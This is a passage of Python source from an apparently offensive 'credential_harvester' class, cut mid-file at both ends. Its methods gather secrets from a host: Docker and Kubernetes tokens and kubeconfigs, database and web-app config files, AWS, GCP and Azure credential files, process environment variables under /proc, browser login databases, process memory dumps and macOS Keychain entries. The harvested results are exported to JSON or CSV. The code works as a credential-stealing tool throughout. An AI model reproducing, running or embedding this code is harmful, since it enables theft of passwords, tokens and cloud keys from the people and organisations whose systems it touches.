                                self.logger.debug("Error reading Docker secret %s: %s", secret_path, e)

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                ) as e:
                    if isinstance(e, PermissionError):
                        self.logger.error("Permission error in credential_harvester: %s", e)
                    else:
                        self.logger.debug("Error accessing Docker secrets: %s", e)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error extracting Docker credentials: %s", e)

        return credentials

    def _linux_kubernetes_tokens(self) -> dict[str, Any]:
        """Extract Kubernetes tokens and service account credentials."""
        credentials = {"kubernetes_credentials": []}

        try:
            # Kubernetes service account token paths
            k8s_token_paths = [
                "/var/run/secrets/kubernetes.io/serviceaccount/token",
                "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
                "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
            ]

            service_account_data = {}
            for token_path in k8s_token_paths:
                if os.path.exists(token_path):
                    try:
                        with open(token_path) as f:
                            content = f.read().strip()

                        file_type = os.path.basename(token_path)
                        service_account_data[file_type] = content

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        self.logger.debug("Error reading K8s token %s: %s", token_path, e)

            if service_account_data:
                credentials["kubernetes_credentials"].append(
                    {
                        "type": "service_account",
                        "data": service_account_data,
                        "source": "mounted_secrets",
                    }
                )

            # Kubernetes config files
            k8s_config_paths = [
                "~/.kube/config",
                "/root/.kube/config",
                "/etc/kubernetes/admin.conf",
                "/etc/kubernetes/kubelet.conf",
                "/etc/kubernetes/controller-manager.conf",
                "/etc/kubernetes/scheduler.conf",
            ]

            for config_path in k8s_config_paths:
                expanded_path = os.path.expanduser(config_path)
                if os.path.exists(expanded_path):
                    try:
                        with open(expanded_path) as f:
                            content = f.read()

                        # Parse YAML config
                        try:
                            import yaml

                            k8s_config = yaml.safe_load(content)

                            # Extract cluster information
                            clusters = k8s_config.get("clusters", [])
                            users = k8s_config.get("users", [])
                            contexts = k8s_config.get("contexts", [])

                            # Process contexts to link users with clusters
                            context_mappings = {}
                            for context in contexts:
                                context_data = context.get("context", {})
                                context_name = context.get("name")
                                if context_data and context_name:
                                    context_mappings[context_name] = {
                                        "cluster": context_data.get("cluster"),
                                        "user": context_data.get("user"),
                                        "namespace": context_data.get("namespace", "default"),
                                    }

                            for user in users:
                                user_data = user.get("user", {})
                                if user_data:
                                    credentials["kubernetes_credentials"].append(
                                        {
                                            "type": "kubeconfig_user",
                                            "name": user.get("name"),
                                            "user_data": user_data,
                                            "source": expanded_path,
                                        }
                                    )

                            for cluster in clusters:
                                cluster_data = cluster.get("cluster", {})
                                if cluster_data:
                                    credentials["kubernetes_credentials"].append(
                                        {
                                            "type": "kubeconfig_cluster",
                                            "name": cluster.get("name"),
                                            "cluster_data": cluster_data,
                                            "source": expanded_path,
                                        }
                                    )

                        except ImportError as e:
                            self.logger.error("Import error in credential_harvester: %s", e)
                            # YAML parser not available, try basic text parsing
                            lines = content.split("\n")
                            for line in lines:
                                if any(keyword in line for keyword in ["token:", "password:", "key:", "cert:"]):
                                    credentials["kubernetes_credentials"].append(
                                        {
                                            "type": "kubeconfig_text",
                                            "line": line.strip(),
                                            "source": expanded_path,
                                        }
                                    )

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        self.logger.debug("Error reading K8s config %s: %s", expanded_path, e)

            # Kubernetes environment variables
            k8s_env_vars = []
            for key, value in os.environ.items():
                if any(keyword in key.upper() for keyword in ["KUBE", "K8S", "KUBERNETES"]):
                    k8s_env_vars.append({"key": key, "value": value})

            if k8s_env_vars:
                credentials["kubernetes_credentials"].append(
                    {
                        "type": "environment_variables",
                        "variables": k8s_env_vars,
                        "source": "environment",
                    }
                )

            # Check for kubectl binary and try to extract current context
            try:
                # Get current context
                result = subprocess.run(
                    ["kubectl", "config", "current-context"],  # noqa: S607
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=5,
                )

                if result.returncode == 0:
                    current_context = result.stdout.strip()
                    credentials["kubernetes_credentials"].append(
                        {
                            "type": "current_context",
                            "context": current_context,
                            "source": "kubectl",
                        }
                    )

                # Try to get cluster info
                cluster_result = subprocess.run(
                    ["kubectl", "cluster-info"],  # noqa: S607
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=5,
                )

                if cluster_result.returncode == 0:
                    credentials["kubernetes_credentials"].append(
                        {
                            "type": "cluster_info",
                            "info": cluster_result.stdout,
                            "source": "kubectl",
                        }
                    )

            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
            ) as e:
                if isinstance(e, FileNotFoundError):
                    self.logger.error("File not found in credential_harvester: %s", e)
                    # kubectl not installed
                else:
                    self.logger.debug("Error running kubectl: %s", e)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error extracting Kubernetes credentials: %s", e)

        return credentials

    def _linux_database_configs(self) -> dict[str, Any]:
        """Extract database configuration credentials from config files."""
        credentials = {"database_configs": []}

        try:
            # Common database configuration file locations
            db_config_paths = [
                "/etc/mysql/my.cnf",
                "/etc/postgresql/*/main/postgresql.conf",
                "/etc/mongodb.conf",
                "/etc/redis.conf",
                "~/.my.cnf",
                "/usr/local/etc/mysql/my.cnf",
                "/opt/lampp/etc/my.cnf",
            ]

            for config_path in db_config_paths:
                expanded_path = os.path.expanduser(config_path)

                if "*" in expanded_path:
                    import glob

                    matching_files = glob.glob(expanded_path)
                    files_to_check = matching_files
                else:
                    files_to_check = [expanded_path] if os.path.exists(expanded_path) else []

                for file_path in files_to_check:
                    try:
                        with open(file_path) as f:
                            content = f.read()

                        # Extract database credentials
                        creds = self._extract_credentials_from_text(content)
                        if creds:
                            credentials["database_configs"].append(
                                {
                                    "config_file": file_path,
                                    "credentials": creds,
                                    "type": "database_config",
                                }
                            )

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        if isinstance(e, (PermissionError, FileNotFoundError)):
                            self.logger.error("Error in credential_harvester: %s", e)
                            continue
                        else:
                            self.logger.debug("Error reading database config %s: %s", file_path, e)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error extracting database configs: %s", e)

        return credentials

    def _linux_application_configs(self) -> dict[str, Any]:
        """Extract application configuration credentials from various app configs."""
        credentials = {"application_configs": []}

        try:
            # Common application configuration locations
            app_config_paths = [
                "/etc/apache2/.htpasswd",
                "/etc/nginx/.htpasswd",
                "/etc/vsftpd.conf",
                "/etc/proftpd/proftpd.conf",
                "/etc/samba/smb.conf",
                "/opt/*/conf/*.conf",
                "~/.config/*/config",
                "/var/www/html/wp-config.php",
                "/var/www/html/config.php",
            ]

            for config_path in app_config_paths:
                expanded_path = os.path.expanduser(config_path)

                if "*" in expanded_path:
                    import glob

                    matching_files = glob.glob(expanded_path, recursive=True)
                    files_to_check = matching_files
                else:
                    files_to_check = [expanded_path] if os.path.exists(expanded_path) else []

                for file_path in files_to_check:
                    try:
                        with open(file_path, encoding="utf-8", errors="ignore") as f:
                            content = f.read()

                        # Extract credentials from app configs
                        creds = self._extract_credentials_from_text(content)
                        if creds:
                            credentials["application_configs"].append(
                                {
                                    "config_file": file_path,
                                    "credentials": creds,
                                    "type": "application_config",
                                }
                            )

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        if isinstance(e, (PermissionError, FileNotFoundError)):
                            self.logger.error("Error in credential_harvester: %s", e)
                            continue
                        else:
                            self.logger.debug("Error reading app config %s: %s", file_path, e)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error extracting application configs: %s", e)

        return credentials

    def _linux_cloud_credentials(self) -> dict[str, Any]:
        """Extract cloud provider credentials from configuration files."""
        credentials = {"cloud_credentials": []}

        try:
            # AWS credentials
            aws_paths = [
                "~/.aws/credentials",
                "~/.aws/config",
                "/root/.aws/credentials",
            ]

            for aws_path in aws_paths:
                expanded_path = os.path.expanduser(aws_path)
                if os.path.exists(expanded_path):
                    try:
                        with open(expanded_path) as f:
                            content = f.read()

                        import configparser

                        config = configparser.ConfigParser()
                        config.read_string(content)

                        for section in config.sections():
                            section_data = dict(config[section])
                            if section_data:
                                credentials["cloud_credentials"].append(
                                    {
                                        "provider": "aws",
                                        "profile": section,
                                        "credentials": section_data,
                                        "source": expanded_path,
                                    }
                                )

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        self.logger.debug("Error reading AWS config %s: %s", expanded_path, e)

            # Google Cloud credentials
            gcp_paths = [
                "~/.config/gcloud/credentials.db",
                "~/.config/gcloud/application_default_credentials.json",
                "/root/.config/gcloud/application_default_credentials.json",
            ]

            for gcp_path in gcp_paths:
                expanded_path = os.path.expanduser(gcp_path)
                if os.path.exists(expanded_path):
                    try:
                        if expanded_path.endswith(".json"):
                            with open(expanded_path) as f:
                                gcp_creds = json.load(f)
                            credentials["cloud_credentials"].append(
                                {
                                    "provider": "gcp",
                                    "credentials": gcp_creds,
                                    "source": expanded_path,
                                }
                            )
                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        self.logger.debug("Error reading GCP config %s: %s", expanded_path, e)

            # Azure credentials
            azure_paths = [
                "~/.azure/accessTokens.json",
                "~/.azure/azureProfile.json",
            ]

            for azure_path in azure_paths:
                expanded_path = os.path.expanduser(azure_path)
                if os.path.exists(expanded_path):
                    try:
                        with open(expanded_path) as f:
                            azure_creds = json.load(f)
                        credentials["cloud_credentials"].append(
                            {
                                "provider": "azure",
                                "credentials": azure_creds,
                                "source": expanded_path,
                            }
                        )
                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        self.logger.debug("Error reading Azure config %s: %s", expanded_path, e)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error extracting cloud credentials: %s", e)

        return credentials

    def _linux_memory_dump(self) -> dict[str, Any]:
        """Extract credentials from memory dump analysis."""
        credentials = {"memory_dump": []}

        try:
            # This is a simplified memory dump analysis
            # In practice, this would use tools like volatility or gdb

            # Check if we have access to /proc/*/maps for process memory analysis
            proc_dirs = []
            try:
                proc_dirs = [d for d in os.listdir("/proc") if d.isdigit()]
            except PermissionError as e:
                self.logger.error("Permission error in credential_harvester: %s", e)

            for pid in proc_dirs[:10]:  # Limit to first 10 processes
                try:
                    maps_file = f"/proc/{pid}/maps"
                    environ_file = f"/proc/{pid}/environ"

                    # Check memory maps for loaded libraries (potential credential storage)
                    if os.path.exists(maps_file):
                        try:
                            with open(maps_file) as f:
                                maps_content = f.read()

                            # Look for interesting libraries that might contain credentials
                            interesting_libs = ["libcrypt", "libssl", "libpam", "libkrb"]
                            for lib in interesting_libs:
                                if lib in maps_content:
                                    credentials["memory_dump"].append(
                                        {
                                            "pid": pid,
                                            "type": "memory_map",
                                            "library": lib,
                                            "source": "proc_maps",
                                        }
                                    )
                        except PermissionError as e:
                            self.logger.error("Permission error in credential_harvester: %s", e)

                    # Check environment variables for credentials
                    if os.path.exists(environ_file):
                        try:
                            with open(environ_file, "rb") as f:
                                environ_data = f.read().decode("utf-8", errors="ignore")

                            # Split by null bytes and look for credential patterns
                            env_vars = environ_data.split("\x00")
                            for env_var in env_vars:
                                if any(keyword in env_var.upper() for keyword in ["PASSWORD", "SECRET", "TOKEN", "KEY"]):
                                    if "=" in env_var:
                                        key, value = env_var.split("=", 1)
                                        credentials["memory_dump"].append(
                                            {
                                                "pid": pid,
                                                "type": "environment_variable",
                                                "key": key,
                                                "value": value,
                                                "source": "proc_environ",
                                            }
                                        )

                        except PermissionError as e:
                            self.logger.error("Permission error in credential_harvester: %s", e)
                            continue

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                ) as e:
                    self.logger.debug("Error analyzing process %s: %s", pid, e)
                    continue

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error extracting memory dump credentials: %s", e)

        return credentials

    # Helper methods

    def _extract_credentials_from_file(self, file_path: str) -> list[dict[str, Any]]:
        """Extract credentials from a single file."""
        credentials = []

        try:
            # Skip binary files
            if not self._is_text_file(file_path):
                return credentials

            with open(file_path, encoding="utf-8", errors="ignore") as f:
                content = f.read()

                # Extract using credential patterns
                creds = self._extract_credentials_from_text(content)
                credentials.extend(creds)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("Error extracting from %s: %s", file_path, e)

        return credentials

    def _extract_credentials_from_text(self, text: str) -> list[dict[str, Any]]:
        """Extract credentials from text using regex patterns."""
        credentials = []

        try:
            # Check each pattern category
            for category, patterns in self.credential_patterns.items():
                for pattern in patterns:
                    matches = re.finditer(pattern, text, re.IGNORECASE)

                    for match in matches:
                        if category == "database":
                            # Database URL pattern has multiple groups
                            if len(match.groups()) >= 4:
                                credentials.append(
                                    {
                                        "type": "database_url",
                                        "username": match.group(1),
                                        "password": match.group(2),
                                        "host": match.group(3),
                                        "database": match.group(4),
                                        "category": category,
                                    }
                                )
                        else:
                            # Simple key-value pattern
                            credentials.append(
                                {
                                    "type": category,
                                    "value": match.group(1) if match.groups() else match.group(0),
                                    "category": category,
                                    "context": text[max(0, match.start() - 50) : match.end() + 50],
                                }
                            )

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("Error extracting credentials from text: %s", e)

        return credentials

    def _extract_browser_credentials(self, db_path: str, browser: str) -> list[dict[str, Any]]:
        """Extract credentials from browser database."""
        credentials = []

        try:
            if not os.path.exists(db_path):
                return credentials

            # Copy database to avoid locks
            import shutil
            import tempfile

            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                shutil.copy2(db_path, temp_file.name)
                temp_db_path = temp_file.name

            # Extract from SQLite database
            try:
                conn = sqlite3.connect(temp_db_path)
                cursor = conn.cursor()

                # Try different table structures
                tables = ["logins", "login_data", "passwords"]

                for table in tables:
                    try:
                        cursor.execute(f"SELECT * FROM {table}")
                        columns = [desc[0] for desc in cursor.description]

                        for row in cursor.fetchall():
                            row_dict = dict(zip(columns, row, strict=False))

                            # Extract relevant fields
                            cred = {
                                "browser": browser,
                                "type": "browser_password",
                            }

                            # Map common column names
                            field_mapping = {
                                "origin_url": ["origin_url", "url", "hostname"],
                                "username": ["username_value", "username", "user"],
                                "password": ["password_value", "password", "passwd"],
                            }

                            for field, possible_columns in field_mapping.items():
                                for col in possible_columns:
                                    if col in row_dict:
                                        cred[field] = row_dict[col]
                                        break

                            if "username" in cred and "password" in cred:
                                credentials.append(cred)

                        break  # Found valid table

                    except sqlite3.OperationalError as e:
                        self.logger.error("sqlite3.OperationalError in credential_harvester: %s", e)
                        continue  # Try next table

                conn.close()

            finally:
                # Cleanup temp file
                try:
                    os.unlink(temp_db_path)
                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                ) as e:
                    self.logger.error("Error in credential_harvester: %s", e)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("Browser credential extraction failed for %s: %s", browser, e)

        return credentials

    def _is_text_file(self, file_path: str) -> bool:
        """Check if file is likely a text file."""
        try:
            with open(file_path, "rb") as f:
                chunk = f.read(1024)

            # Check for null bytes (indication of binary file)
            if b"\x00" in chunk:
                return False

            # Try to decode as UTF-8
            chunk.decode("utf-8")
            return True

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error in credential_harvester: %s", e)
            return False

    def _create_windows_memory_dump(self, process_name: str) -> str | None:
        """Create Windows memory dump."""
        try:
            import tempfile

            dump_path = os.path.join(tempfile.gettempdir(), f"{process_name}_{int(time.time())}.dmp")

            # Try different dump methods
            dump_commands = [
                f"procdump -ma {process_name} {dump_path}",
                f'tasklist /fi "imagename eq {process_name}"',
            ]

            for cmd in dump_commands:
                try:
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        shlex.split(cmd),
                        check=False,
                        capture_output=True,
                        text=True,
                        shell=False,  # Explicitly secure - using list format prevents shell injection
                    )
                    if result.returncode == 0:
                        return dump_path
                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                ) as e:
                    self.logger.error("Error in credential_harvester: %s", e)
                    continue

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("Windows memory dump creation failed: %s", e)

        return None

    def _create_linux_memory_dump(self, process_name: str | None) -> str | None:
        """Create Linux memory dump."""
        import tempfile

        try:
            if not process_name:
                # Default to dumping current process memory
                process_name = str(os.getpid())

            dump_path = f"{tempfile.gettempdir()}/{process_name}_{int(time.time())}.dump"

            # Try gcore or gdb
            dump_commands = [
                f"gcore -o {dump_path} {process_name}",
                f'gdb --batch --quiet -ex "generate-core-file {dump_path}" --pid {process_name}',
            ]

            for cmd in dump_commands:
                try:
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        shlex.split(cmd),
                        check=False,
                        capture_output=True,
                        text=True,
                        shell=False,  # Explicitly secure - using list format prevents shell injection
                    )
                    if result.returncode == 0:
                        return dump_path
                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                ) as e:
                    self.logger.error("Error in credential_harvester: %s", e)
                    continue

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("Linux memory dump creation failed: %s", e)

        return None

    def _parse_memory_dump(self, dump_path: str) -> dict[str, Any]:
        """Parse memory dump for credentials."""
        credentials = {}

        try:
            # This would use tools like pypykatz, volatility, etc.
            # For now, just search for credential patterns in dump
            with open(dump_path, "rb") as f:
                # Read in chunks to avoid memory issues
                chunk_size = 1024 * 1024  # 1MB chunks
                chunk_num = 0

                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break

                    # Try to decode and search for patterns
                    try:
                        text = chunk.decode("utf-8", errors="ignore")
                        chunk_creds = self._extract_credentials_from_text(text)

                        if chunk_creds:
                            credentials[f"chunk_{chunk_num}"] = chunk_creds

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        self.logger.error("Error in credential_harvester: %s", e)

                    chunk_num += 1

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("Memory dump parsing failed: %s", e)

        return credentials

    def _process_credentials(self, credentials: dict[str, Any], output_format: str) -> Any:
        """Process and format harvested credentials."""
        if output_format == "json":
            return json.dumps(credentials, indent=2)
        if output_format == "csv":
            # Convert to CSV format
            csv_data = []
            for technique, creds in credentials.items():
                if isinstance(creds, list):
                    for cred in creds:
                        row = {"technique": technique}
                        if isinstance(cred, dict):
                            row.update(cred)
                        else:
                            row["credential"] = str(cred)
                        csv_data.append(row)
                elif isinstance(creds, dict):
                    # Handle dict credentials
                    row = {"technique": technique}
                    row.update(creds)
                    csv_data.append(row)
                else:
                    # Handle other credential types
                    csv_data.append({"technique": technique, "credential": str(creds)})
            return csv_data
        return credentials

    def _count_credentials(self, credentials: dict[str, Any]) -> int:
        """Count total number of credentials found."""
        count = 0

        for _, creds in credentials.items():
            if isinstance(creds, list) or isinstance(creds, dict):
                count += len(creds)

        return count

    def _generate_session_id(self) -> str:
        """Generate unique session identifier."""
        import hashlib
        import secrets

        data = f"{time.time()}-{secrets.randbelow(9000) + 1000}"
        return hashlib.sha256(data.encode()).hexdigest()[:16]

    # Public interface methods

    def get_harvested_sessions(self) -> list[dict[str, Any]]:
        """Get list of credential harvesting sessions."""
        sessions = []

        for session_id, session_info in self.harvested_credentials.items():
            sessions.append(
                {
                    "session_id": session_id,
                    "timestamp": session_info["timestamp"],
                    "target_os": session_info["target_os"],
                    "techniques": session_info["techniques"],
                    "credential_count": self._count_credentials(session_info["credentials"]),
                }
            )

        return sessions

    def get_session_credentials(self, session_id: str) -> dict[str, Any] | None:
        """Get credentials for a specific session."""
        return self.harvested_credentials.get(session_id)

    def export_credentials(self, session_id: str, output_file: str, output_format: str = "json") -> bool:
        """Export credentials to file."""
        try:
            if session_id not in self.harvested_credentials:
                return False

            credentials = self.harvested_credentials[session_id]["credentials"]
            formatted_creds = self._process_credentials(credentials, output_format)

            if output_format == "json":
                with open(output_file, "w") as f:
                    f.write(formatted_creds)
            elif output_format == "csv":
                import csv

                with open(output_file, "w", newline="") as f:
                    if formatted_creds:
                        writer = csv.DictWriter(f, fieldnames=formatted_creds[0].keys())
                        writer.writeheader()
                        writer.writerows(formatted_creds)
            else:
                with open(output_file, "w") as f:
                    f.write(str(formatted_creds))

            return True

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Credential export failed: %s", e)
            return False

    def clear_session(self, session_id: str) -> bool:
        """Clear a specific harvesting session."""
        if session_id in self.harvested_credentials:
            del self.harvested_credentials[session_id]
            return True
        return False

    def clear_all_sessions(self):
        """Clear all harvesting sessions."""
        self.harvested_credentials.clear()

    def get_available_techniques(self, target_os: str | None = None) -> dict[str, list[str]]:
        """Get available harvesting techniques."""
        if target_os:
            return {target_os: list(self.harvesting_techniques.get(target_os, {}).keys())}
        return {os: list(techniques.keys()) for os, techniques in self.harvesting_techniques.items()}

    def validate_credentials(self, credentials: dict[str, Any]) -> dict[str, Any]:
        """Validate harvested credentials against targets."""
        validation_results = {
            "validated": 0,
            "invalid": 0,
            "results": [],
            "validation_time": time.time(),
        }

        if not credentials:
            validation_results["results"].append(
                {
                    "status": "error",
                    "message": "No credentials provided for validation",
                }
            )
            return validation_results

        self.logger.info("Validating %s credential sets", len(credentials))

        for technique, cred_data in credentials.items():
            technique_result = {
                "technique": technique,
                "valid_credentials": [],
                "invalid_credentials": [],
                "errors": [],
            }

            try:
                if isinstance(cred_data, list):
                    for i, cred in enumerate(cred_data):
                        if self._validate_single_credential(cred):
                            # Add index information for tracking
                            cred_with_index = dict(cred) if isinstance(cred, dict) else {"value": cred}
                            cred_with_index["index"] = i
                            technique_result["valid_credentials"].append(cred_with_index)
                            validation_results["validated"] += 1
                        else:
                            # Add index information for tracking
                            cred_with_index = dict(cred) if isinstance(cred, dict) else {"value": cred}
                            cred_with_index["index"] = i
                            technique_result["invalid_credentials"].append(cred_with_index)
                            validation_results["invalid"] += 1

                elif isinstance(cred_data, dict):
                    if self._validate_single_credential(cred_data):
                        technique_result["valid_credentials"].append(cred_data)
                        validation_results["validated"] += 1
                    else:
                        technique_result["invalid_credentials"].append(cred_data)
                        validation_results["invalid"] += 1
                else:
                    technique_result["errors"].append(f"Invalid credential data type: {type(cred_data)}")
                    validation_results["invalid"] += 1

            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
            ) as e:
                technique_result["errors"].append(str(e))
                self.logger.warning("Error validating credentials for %s: %s", technique, e)

            validation_results["results"].append(technique_result)

        self.logger.info(
            "Validation complete: %s valid, %s invalid",
            validation_results["validated"],
            validation_results["invalid"],
        )
        return validation_results

    def _validate_single_credential(self, credential: Any) -> bool:
        """Validate a single credential entry."""
        if not isinstance(credential, dict):
            return False

        # Check for common credential fields
        required_fields = {"username", "password", "domain", "hash", "key", "token"}
        credential_fields = set(credential.keys())

        # Must have at least one authentication field
        if not credential_fields.intersection(required_fields):
            return False

        # Validate specific field formats
        if "username" in credential:
            username = credential["username"]
            if not username or not isinstance(username, str) or len(username.strip()) == 0:
                return False

        if "password" in credential:
            password = credential["password"]
            if not isinstance(password, str):
                return False

        if "hash" in credential:
            hash_value = credential["hash"]
            if not isinstance(hash_value, str) or len(hash_value) < 16:
                return False

        if "domain" in credential:
            domain = credential["domain"]
            if not isinstance(domain, str):
                return False

        return True

    # macOS harvesting techniques

    def _macos_keychain_extraction(self) -> dict[str, Any]:
        """Extract credentials from macOS Keychain."""
        credentials = {"keychain_credentials": []}

        try:
            # List all keychains
            keychain_list_cmd = ["security", "list-keychains"]
            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                keychain_list_cmd,
                check=False,
                capture_output=True,
                text=True,
                timeout=10,
                shell=False,  # Explicitly secure - using list format prevents shell injection
            )

            if result.returncode == 0:
                keychains = result.stdout.strip().split("\n")

                for keychain_path in keychains:
                    # Clean up the path
                    keychain_path = keychain_path.strip().strip('"')

                    # Dump keychain items
                    dump_cmd = ["security", "dump-keychain", keychain_path]
                    dump_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        dump_cmd,
                        check=False,
                        capture_output=True,
                        text=True,
                        timeout=30,
                        shell=False,  # Explicitly secure - using list format prevents shell injection
                    )

                    if dump_result.returncode == 0:
                        # Parse keychain dump
                        items = self._parse_keychain_dump(dump_result.stdout)

                        for item in items:
                            credentials["keychain_credentials"].append(
                                {
                                    "keychain": os.path.basename(keychain_path),
                                    "item_type": item.get("class", "unknown"),
                                    "service": item.get("service", ""),
                                    "account": item.get("account", ""),
                                    "server": item.get("server", ""),
                                    "protocol": item.get("protocol", ""),
                                    "auth_type": item.get("auth_type", ""),
                                    "port": item.get("port", ""),
                                    "path": item.get("path", ""),
                                    "source": "keychain",
                                    "note": "Password requires keychain unlock",
                                }
                            )

            # Try to extract internet passwords
            internet_cmd = ["security", "find-internet-password", "-g"]
            internet_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                internet_cmd,
                check=False,
                capture_output=True,
                text=True,
                timeout=10,
                shell=False,  # Explicitly secure - using list format prevents shell injection
            )

            if internet_result.returncode == 0 or internet_result.stderr:
                # Password is often in stderr
                password_info = self._extract_keychain_password_info(internet_result.stdout + internet_result.stderr)
                if password_info:
                    credentials["keychain_credentials"].append(password_info)

            # Try to extract generic passwords
            generic_cmd = ["security", "find-generic-password", "-g"]
            generic_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                generic_cmd,
                check=False,
                capture_output=True,
                text=True,
                timeout=10,
                shell=False,  # Explicitly secure - using list format prevents shell injection
            )

            if generic_result.returncode == 0 or generic_result.stderr:
                password_info = self._extract_keychain_password_info(generic_result.stdout + generic_result.stderr)
                if password_info:
                    credentials["keychain_credentials"].append(password_info)

        except FileNotFoundError:
            self.logger.warning("security command not found - not running on macOS")
        except Exception as e:
            self.logger.error("Error extracting macOS keychain: %s", e)

        return credentials

    def _macos_browser_passwords(self) -> dict[str, Any]:
        """Extract browser passwords from macOS."""
        credentials = {"browser_passwords": []}

        try:
            # Safari passwords are stored in Keychain
            safari_keychain_path = os.path.expanduser("~/Library/Keychains/login.keychain-db")

            if os.path.exists(safari_keychain_path):
                # Safari stores passwords in keychain - use security command
                safari_cmd = ["security", "find-internet-password", "-s", "*", "-a", "*", "-D", "Safari Web Form", safari_keychain_path]

                try:
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        safari_cmd,
                        check=False,
                        capture_output=True,
                        text=True,
                        timeout=10,
                        shell=False,  # Explicitly secure - using list format prevents shell injection
                    )

                    if result.returncode == 0 or result.stderr:
                        # Parse Safari credentials
                        safari_creds = self._parse_safari_keychain(result.stdout + result.stderr)
                        if safari_creds:
                            credentials["browser_passwords"].extend(safari_creds)

                except Exception as e:
                    self.logger.debug("Error extracting Safari passwords: %s", e)

            # Chrome on macOS
            chrome_paths = [
                os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"),
                os.path.expanduser("~/Library/Application Support/Google/Chrome/Profile */Login Data"),
            ]

            for chrome_path in chrome_paths:
                if "*" in chrome_path:
                    import glob

                    matching_paths = glob.glob(chrome_path)
                    for path in matching_paths:
                        chrome_creds = self._extract_browser_credentials(path, "chrome")
                        if chrome_creds:
                            credentials["browser_passwords"].extend(chrome_creds)
                elif os.path.exists(chrome_path):
                    chrome_creds = self._extract_browser_credentials(chrome_path, "chrome")
                    if chrome_creds:
                        credentials["browser_passwords"].extend(chrome_creds)

            # Firefox on macOS
